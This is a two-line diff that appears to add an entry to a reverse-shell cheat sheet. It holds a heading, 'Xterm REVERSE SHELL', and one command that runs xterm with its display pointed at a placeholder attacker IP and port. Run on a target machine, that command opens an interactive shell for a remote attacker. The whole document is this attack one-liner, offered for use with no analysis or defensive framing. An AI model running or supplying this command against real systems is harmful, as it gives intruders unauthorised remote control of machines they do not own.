@@ -1,0 +1,2 @@
+Xterm REVERSE SHELL
+xterm -display $IP:$PORT
